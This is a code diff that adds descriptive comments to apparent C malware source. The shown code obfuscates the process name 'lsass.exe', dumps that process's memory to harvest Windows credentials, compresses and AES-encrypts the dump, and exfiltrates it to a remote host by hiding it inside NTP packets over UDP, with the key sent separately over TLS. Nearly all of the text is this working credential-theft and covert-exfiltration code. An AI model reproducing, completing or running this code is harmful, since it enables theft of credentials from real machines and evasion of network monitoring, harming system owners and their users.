@@ -21,6 +21,7 @@
 #define AES_TAG_SIZE 16
 #define COMPRESSED_BUFFER_SIZE 1024
 
+// Function to send AES key and IV securely via TLS
 int send_key_securely(const char *target_ip, int target_tls_port, const unsigned char *key, const unsigned char *iv) {
     SSL_library_init();
     SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
@@ -71,6 +72,7 @@ int send_key_securely(const char *target_ip, int target_tls_port, const unsigned
     return 0;
 }
 
+// Function to decode a string obfuscated with XOR
 void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
     size_t i = 0;
     while (encoded[i] != L'\0' && i < maxLen - 1) {
@@ -80,6 +82,7 @@ void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxL
     decoded[i] = L'\0';
 }
 
+// Function to get the PID of a target process by name
 DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     DWORD pid = 0;
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
@@ -117,6 +120,7 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     return pid;
 }
 
+// Function to dump the memory of a target process
 BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
     if (!hDbgHelp)
@@ -192,6 +196,7 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     return success;
 }
 
+// Function to compress a buffer using zlib
 int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
     uLong bound = compressBound(inputSize);
     *compressedBuffer = (char*)malloc(bound);
@@ -206,12 +211,14 @@ int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedB
     return res;
 }
 
+// Function to create an NTP packet with a payload
 void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
     memset(packet, 0, 48);
     packet[0] = 0x1B; // LI=0, VN=3, Mode=3
     memcpy(packet + 40, payload, 8);
 }
 
+// Function to send an NTP packet via UDP
 int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
     HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
     if (!hWs2_32)
@@ -256,6 +263,7 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
     return result;
 }
 
+// Function to send a compressed dump as NTP packets
 int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *data, size_t data_size) {
     unsigned char key[AES_KEY_SIZE], iv[AES_IV_SIZE], tag[AES_TAG_SIZE];
     unsigned char compressed_data[COMPRESSED_BUFFER_SIZE];
@@ -324,6 +332,7 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
 }
 
 int main(void) {
+    // Obfuscated target process name "lsass.exe"
     wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                   's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
                                   'e' ^ 0x13, L'\0' };
